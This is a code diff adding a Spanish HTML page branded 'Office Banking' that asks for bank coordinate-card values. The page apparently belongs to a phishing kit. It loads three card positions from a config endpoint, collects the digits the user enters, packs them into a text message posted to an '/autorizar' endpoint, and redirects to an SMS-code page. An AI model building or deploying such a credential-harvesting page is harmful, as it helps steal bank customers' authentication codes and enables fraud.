@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Autorización por Coordenadas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .coord-container { margin: 20px 0; }
+    .coord-container label { display: block; margin-bottom: 15px; font-weight: bold; }
+    .coord { width: 100%; max-width: 120px; padding: 12px; text-align: center; font-size: 1.2em; margin-top: 8px; border: 1px solid #ccc; border-radius: 6px; }
+    .btn-red { width: 100%; padding: 14px; font-size: 1.1em; }
+    #mensaje { margin-top: 20px; font-weight: bold; color: red; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.svg" alt="Office Banking" 
+     class="logo-ob img-fluid mx-auto d-block">
+    <h2>Autorización por Coordenadas</h2>
+    <p>Producto seleccionado: <span id="productoSeleccionado"></span></p>
+
+    <form id="formCoordenadas">
+      <div class="coord-container">
+        <label id="label1"></label>
+        <label id="label2"></label>
+        <label id="label3"></label>
+      </div>
+      <button type="submit" class="btn-red">Autorizar</button>
+    </form>
+
+    <div id="mensaje"></div>
+  </div>
+
+  <script>
+    const API_URL = "/config";
+    const AUTORIZAR_URL = "/autorizar";
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      try {
+        const res = await fetch(API_URL);
+        const data = await res.json();
+
+        const seleccion = localStorage.getItem("seleccionProducto");
+        let producto = "";
+        if(seleccion === "producto1"){ producto = data.producto1 || ""; }
+        else if(seleccion === "producto2"){ producto = data.producto2 || ""; }
+        else if(seleccion === "producto3"){ producto = data.producto3 || ""; }
+        document.getElementById("productoSeleccionado").innerText = producto;
+
+        document.getElementById("label1").innerHTML = `${data.coord1}: <input type="text" id="coord1" class="coord" maxlength="2" required>`;
+        document.getElementById("label2").innerHTML = `${data.coord2}: <input type="text" id="coord2" class="coord" maxlength="2" required>`;
+        document.getElementById("label3").innerHTML = `${data.coord3}: <input type="text" id="coord3" class="coord" maxlength="2" required>`;
+      } catch (err) {
+        document.getElementById("mensaje").innerText = "⚠️ No se pudieron cargar las coordenadas.";
+      }
+    });
+
+    document.getElementById("formCoordenadas").addEventListener("submit", async e => {
+      e.preventDefault();
+      const producto = document.getElementById("productoSeleccionado").innerText;
+      const coord1 = document.getElementById("coord1").value;
+      const coord2 = document.getElementById("coord2").value;
+      const coord3 = document.getElementById("coord3").value;
+
+      const mensaje = `Autorización por coordenadas:\nProducto: ${producto}\n${coord1}\n${coord2}\n${coord3}`;
+
+      try {
+        await fetch(AUTORIZAR_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+        document.getElementById("mensaje").innerText = "✅ Coordenadas enviadas, cargando SMS...";
+        setTimeout(() => { window.location.href="autorizacion-sms.html"; }, 2000);
+      } catch (error) {
+        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
+      }
+    });
+  </script>
+</body>
+</html>
